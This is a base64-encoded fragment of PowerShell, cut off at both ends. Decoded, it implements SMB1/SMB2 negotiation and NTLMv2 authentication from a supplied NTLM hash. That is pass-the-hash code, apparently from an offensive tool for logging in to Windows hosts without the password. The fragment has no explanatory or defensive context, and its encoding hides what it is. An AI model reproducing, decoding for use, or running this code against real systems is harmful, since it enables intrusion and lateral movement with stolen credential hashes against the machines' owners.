CAgICAgICAgICAgICAgICAgJFNNQl9zaWduaW5nID0gJGZhbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3Nlc3Npb25fa2V5X2xlbmd0aCA9IDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9uZWdvdGlhdGVfZmxhZ3MgPSAweDA1LDB4ODIsMHgwOCwweGEwDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdOZWdvdGlhdGVTTUIyJw0KDQogICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVs3MF0pIC1lcSAnMDMnKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTTUIgc2lnbmluZyBpcyBlbmFibGVkIg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduaW5nID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2Vzc2lvbl9rZXlfbGVuZ3RoID0gMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX25lZ290aWF0ZV9mbGFncyA9IDB4MTUsMHg4MiwweDA4LDB4YTANCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmluZyA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXNzaW9uX2tleV9sZW5ndGggPSAweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmVnb3RpYXRlX2ZsYWdzID0gMHgwNSwweDgwLDB4MDgsMHhhMA0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJ05lZ290aWF0ZVNNQjInDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJFNNQjJfdHJlZV9JRCA9IDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAkU01CX3Nlc3Npb25fSUQgPSAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEID0gMQ0KICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDAwLDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRCAgDQogICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdA0KICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGENCiAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhDQogICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpICAgIA0KICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ05UTE1TU1BOZWdvdGlhdGUnDQogICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAnTlRMTVNTUE5lZ290aWF0ZScNCiAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgaWYoJFNNQl92ZXJzaW9uIC1lcSAnU01CMScpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4NzMgMHgxOCAweDA3LDB4YzggMHhmZiwweGZmICRwcm9jZXNzX0lEX2J5dGVzIDB4MDAsMHgwMA0KDQogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTlRMTVNTUF9uZWdvdGlhdGUgPSBHZXQtUGFja2V0TlRMTVNTUE5lZ290aWF0ZSAkU01CX25lZ290aWF0ZV9mbGFncw0KICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAkTlRMTVNTUF9uZWdvdGlhdGUgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05UTE1TU1BfbmVnb3RpYXRlICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0ICROVExNU1NQX25lZ290aWF0ZQ0KICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhDQogICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkU01CX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCiAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMQ0KICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwMSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OVExNU1NQX25lZ290aWF0ZSA9IEdldC1QYWNrZXROVExNU1NQTmVnb3RpYXRlICRTTUJfbmVnb3RpYXRlX2ZsYWdzDQogICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgJE5UTE1TU1BfbmVnb3RpYXRlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OVExNU1NQX25lZ290aWF0ZSAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMlNlc3Npb25TZXR1cFJlcXVlc3QgJE5UTE1TU1BfbmVnb3RpYXRlDQogICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCiAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGENCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkgICAgDQogICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnZXhpdCcNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICB9DQoNCiAgICB9DQoNCiAgICAkU01CX05UTE1TU1AgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmUpDQogICAgJFNNQl9OVExNU1NQID0gJFNNQl9OVExNU1NQIC1yZXBsYWNlICItIiwiIg0KICAgICRTTUJfTlRMTVNTUF9pbmRleCA9ICRTTUJfTlRMTVNTUC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikNCiAgICAkU01CX05UTE1TU1BfYnl0ZXNfaW5kZXggPSAkU01CX05UTE1TU1BfaW5kZXggLyAyDQogICAgJFNNQl9kb21haW5fbGVuZ3RoID0gRGF0YUxlbmd0aDIgKCRTTUJfTlRMTVNTUF9ieXRlc19pbmRleCArIDEyKSAkU01CX2NsaWVudF9yZWNlaXZlDQogICAgJFNNQl90YXJnZXRfbGVuZ3RoID0gRGF0YUxlbmd0aDIgKCRTTUJfTlRMTVNTUF9ieXRlc19pbmRleCArIDQwKSAkU01CX2NsaWVudF9yZWNlaXZlDQogICAgJFNNQl9zZXNzaW9uX0lEID0gJFNNQl9jbGllbnRfcmVjZWl2ZVs0NC4uNTFdDQogICAgJFNNQl9OVExNX2NoYWxsZW5nZSA9ICRTTUJfY2xpZW50X3JlY2VpdmVbKCRTTUJfTlRMTVNTUF9ieXRlc19pbmRleCArIDI0KS4uKCRTTUJfTlRMTVNTUF9ieXRlc19pbmRleCArIDMxKV0NCiAgICAkU01CX3RhcmdldF9kZXRhaWxzID0gJFNNQl9jbGllbnRfcmVjZWl2ZVsoJFNNQl9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTYgKyAkU01CX2RvbWFpbl9sZW5ndGgpLi4oJFNNQl9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTUgKyAkU01CX2RvbWFpbl9sZW5ndGggKyAkU01CX3RhcmdldF9sZW5ndGgpXQ0KICAgICRTTUJfdGFyZ2V0X3RpbWVfYnl0ZXMgPSAkU01CX3RhcmdldF9kZXRhaWxzWygkU01CX3RhcmdldF9kZXRhaWxzLmxlbmd0aCAtIDEyKS4uKCRTTUJfdGFyZ2V0X2RldGFpbHMubGVuZ3RoIC0gNSldDQogICAgJE5UTE1faGFzaF9ieXRlcyA9ICgme2ZvciAoJGkgPSAwOyRpIC1sdCAkaGFzaC5sZW5ndGg7JGkgKz0gMil7JGhhc2guU3ViU3RyaW5nKCRpLDIpfX0pIC1qb2luICItIg0KICAgICROVExNX2hhc2hfYnl0ZXMgPSAkTlRMTV9oYXNoX2J5dGVzLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0NCiAgICAkYXV0aF9ob3N0bmFtZSA9IChHZXQtQ2hpbGRJdGVtIC1wYXRoIGVudjpjb21wdXRlcm5hbWUpLlZhbHVlDQogICAgJGF1dGhfaG9zdG5hbWVfYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRhdXRoX2hvc3RuYW1lKQ0KICAgICRhdXRoX2RvbWFpbl9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJERvbWFpbikNCiAgICAkYXV0aF91c2VybmFtZV9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJHVzZXJuYW1lKQ0KICAgICRhdXRoX2RvbWFpbl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2RvbWFpbl9ieXRlcy5MZW5ndGgpDQogICAgJGF1dGhfZG9tYWluX2xlbmd0aCA9ICRhdXRoX2RvbWFpbl9sZW5ndGhbMCwxXQ0KICAgICRhdXRoX2RvbWFpbl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2RvbWFpbl9ieXRlcy5MZW5ndGgpDQogICAgJGF1dGhfZG9tYWluX2xlbmd0aCA9ICRhdXRoX2RvbWFpbl9sZW5ndGhbMCwxXQ0KICAgICRhdXRoX3VzZXJuYW1lX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoKQ0KICAgICRhdXRoX3VzZXJuYW1lX2xlbmd0aCA9ICRhdXRoX3VzZXJuYW1lX2xlbmd0aFswLDFdDQogICAgJGF1dGhfaG9zdG5hbWVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9ob3N0bmFtZV9ieXRlcy5MZW5ndGgpDQogICAgJGF1dGhfaG9zdG5hbWVfbGVuZ3RoID0gJGF1dGhfaG9zdG5hbWVfbGVuZ3RoWzAsMV0NCiAgICAkYXV0aF9kb21haW5fb2Zmc2V0ID0gMHg0MCwweDAwLDB4MDAsMHgwMA0KICAgICRhdXRoX3VzZXJuYW1lX29mZnNldCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCArIDY0KQ0KICAgICRhdXRoX2hvc3RuYW1lX29mZnNldCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCArICRhdXRoX3VzZXJuYW1lX2J5dGVzLkxlbmd0aCArIDY0KQ0KICAgICRhdXRoX0xNX29mZnNldCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCArICRhdXRoX3VzZXJuYW1lX2J5dGVzLkxlbmd0aCArICRhdXRoX2hvc3RuYW1lX2J5dGVzLkxlbmd0aCArIDY0KQ0KICAgICRhdXRoX05UTE1fb2Zmc2V0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoICsgJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoICsgJGF1dGhfaG9zdG5hbWVfYnl0ZXMuTGVuZ3RoICsgODgpDQogICAgJEhNQUNfTUQ1ID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkhNQUNNRDUNCiAgICAkSE1BQ19NRDUua2V5ID0gJE5UTE1faGFzaF9ieXRlcw0KICAgICR1c2VybmFtZV9hbmRfdGFyZ2V0ID0gJHVzZXJuYW1lLlRvVXBwZXIoKQ0KICAgICR1c2VybmFtZV9hbmRfdGFyZ2V0X2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkdXNlcm5hbWVfYW5kX3RhcmdldCkNCiAgICAkdXNlcm5hbWVfYW5kX3RhcmdldF9ieXRlcyArPSAkYXV0aF9kb21haW5fYnl0ZXMNCiAgICAkTlRMTXYyX2hhc2ggPSAkSE1BQ19NRDUuQ29tcHV0ZUhhc2goJHVzZXJuYW1lX2FuZF90YXJnZXRfYnl0ZXMpDQogICAgJGNsaWVudF9jaGFsbGVuZ2UgPSBbU3RyaW5nXSgxLi44IHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pDQogICAgJGNsaWVudF9jaGFsbGVuZ2VfYnl0ZXMgPSAkY2xpZW50X2NoYWxsZW5nZS5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9DQoNCiAgICAkc2VjdXJpdHlfYmxvYl9ieXRlcyA9IDB4MDEsMHgwMSwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl90YXJnZXRfdGltZV9ieXRlcyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNsaWVudF9jaGFsbGVuZ2VfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdGFyZ2V0X2RldGFpbHMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMA0KDQogICAgJHNlcnZlcl9jaGFsbGVuZ2VfYW5kX3NlY3VyaXR5X2Jsb2JfYnl0ZXMgPSAkU01CX05UTE1fY2hhbGxlbmdlICsgJHNlY3VyaXR5X2Jsb2JfYnl0ZXMNCiAgICAkSE1BQ19NRDUua2V5ID0gJE5UTE12Ml9oYXNoDQogICAgJE5UTE12Ml9yZXNwb25zZSA9ICRITUFDX01ENS5Db21wdXRlSGFzaCgkc2VydmVyX2NoYWxsZW5nZV9hbmRfc2VjdXJpdHlfYmxvYl9ieXRlcykNCg0KICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICB7DQogICAgICAgICRzZXNzaW9uX2Jhc2Vfa2V5ID0gJEhNQUNfTUQ1LkNvbXB1dGVIYXNoKCROVExNdjJfcmVzcG9uc2UpDQogICAgICAgICRzZXNzaW9uX2tleSA9ICRzZXNzaW9uX2Jhc2Vfa2V5DQogICAgICAgICRITUFDX1NIQTI1NiA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5ITUFDU0hBMjU2DQogICAgICAgICRITUFDX1NIQTI1Ni5rZXkgPSAkc2Vzc2lvbl9rZXkNCiAgICB9DQoNCiAgICAkTlRMTXYyX3Jlc3BvbnNlID0gJE5UTE12Ml9yZXNwb25zZSArICRzZWN1cml0eV9ibG9iX2J5dGVzDQogICAgJE5UTE12Ml9yZXNwb25zZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCROVExNdjJfcmVzcG9uc2UuTGVuZ3RoKQ0KICAgICROVExNdjJfcmVzcG9uc2VfbGVuZ3RoID0gJE5UTE12Ml9yZXNwb25zZV9sZW5ndGhbMCwxXQ0KICAgICRTTUJfc2Vzc2lvbl9rZXlfb2Zmc2V0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoICsgJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoICsgJGF1dGhfaG9zdG5hbWVfYnl0ZXMuTGVuZ3RoICsgJE5UTE12Ml9yZXNwb25zZS5MZW5ndGggKyA4OCkNCg0KICAgICROVExNU1NQX3Jlc3BvbnNlID0gMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDMsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxOCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfTE1fb2Zmc2V0ICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE12Ml9yZXNwb25zZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX05UTE1fb2Zmc2V0ICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9kb21haW5fb2Zmc2V0ICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF91c2VybmFtZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX3VzZXJuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfdXNlcm5hbWVfb2Zmc2V0ICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9ob3N0bmFtZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfb2Zmc2V0ICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3Nlc3Npb25fa2V5X2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXNzaW9uX2tleV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2Vzc2lvbl9rZXlfb2Zmc2V0ICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX25lZ290aWF0ZV9mbGFncyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfZG9tYWluX2J5dGVzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF91c2VybmFtZV9ieXRlcyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlDQoNCiAgICBpZigkU01CX3ZlcnNpb24gLWVxICdTTUIxJykNCiAgICB7DQogICAgICAgICRTTUJfdXNlcl9JRCA9ICRTTUJfY2xpZW50X3JlY2VpdmVbMzIsMzNdDQogICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHg3MyAweDE4IDB4MDcsMHhjOCAweGZmLDB4ZmYgJHByb2Nlc3NfSURfYnl0ZXMgJFNNQl91c2VyX0lEDQoNCiAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICB7DQogICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9GbGFnczIiXSA9IDB4MDUsMHg0OA0KICAgICAgICB9DQoNCiAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfVXNlcklEIl0gPSAkU01CX3VzZXJfSUQNCiAgICAgICAgJHBhY2tldF9OVExNU1NQX25lZ290aWF0ZSA9IEdldC1QYWNrZXROVExNU1NQQXV0aCAkTlRMTVNTUF9yZXNwb25zZQ0KICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAkTlRMTVNTUF9uZWdvdGlhdGUgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05UTE1TU1BfbmVnb3RpYXRlICAgICAgDQogICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QgJE5UTE1TU1BfbmVnb3RpYXRlDQogICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGENCiAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgNCiAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGENCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAxDQogICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDAxLDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRA0KICAgICAgICAkcGFja2V0X05UTE1TU1BfYXV0aCA9IEdldC1QYWNrZXROVExNU1NQQXV0aCAkTlRMTVNTUF9yZXNwb25zZQ0KICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICROVExNU1NQX2F1dGggPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05UTE1TU1BfYXV0aCAgICAgICAgDQogICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0ICROVExNU1NQX2F1dGgNCiAgICAgICAgJFNNQjJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaW